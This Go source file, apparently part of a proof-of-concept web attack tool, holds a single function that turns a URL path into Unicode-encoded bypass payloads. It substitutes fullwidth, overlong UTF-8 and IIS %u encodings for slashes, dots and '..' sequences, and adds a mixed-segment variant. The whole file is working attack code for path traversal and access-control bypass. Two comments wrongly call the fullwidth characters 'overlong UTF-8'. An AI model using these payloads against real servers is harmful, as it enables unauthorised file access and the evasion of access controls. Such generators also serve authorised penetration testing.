package poc

import "strings"

// UnicodeFull 生成更完整的 Unicode 编码绕过 payload
func UnicodeFull(path string) []string {
	var results []string

	// Overlong UTF-8 编码的 / (fullwidth solidus)
	results = append(results, strings.ReplaceAll(path, "/", "%ef%bc%8f"))

	// Overlong UTF-8 编码的 . (fullwidth full stop)
	results = append(results, strings.ReplaceAll(path, ".", "%ef%bc%8e"))

	// %c0%af = overlong encoding of /
	results = append(results, strings.ReplaceAll(path, "/", "%c0%af"))

	// %c1%9c = overlong encoding of \
	if len(path) > 1 {
		results = append(results, "/"+strings.ReplaceAll(path[1:], "/", "%c1%9c"))
	}

	// %u002f = IIS Unicode encoding of /
	if len(path) > 1 {
		results = append(results, "/"+strings.ReplaceAll(path[1:], "/", "%u002f"))
	}

	// %u002e%u002e%u002f = Unicode encoded ../
	// Already covered in Pathtraversal.go but add more variants
	results = append(results, strings.ReplaceAll(path, "..", "%u002e%u002e"))

	// 混合: 第一段正常，后续段用 Unicode
	parts := strings.Split(path, "/")
	if len(parts) > 2 {
		var sb strings.Builder
		for i, part := range parts {
			if part == "" && i == 0 {
				sb.WriteString("/")
				continue
			}
			if part == "" {
				continue
			}
			sb.WriteString(part)
			if i < len(parts)-1 {
				sb.WriteString("%ef%bc%8f")
			}
		}
		results = append(results, sb.String())
	}

	return results
}
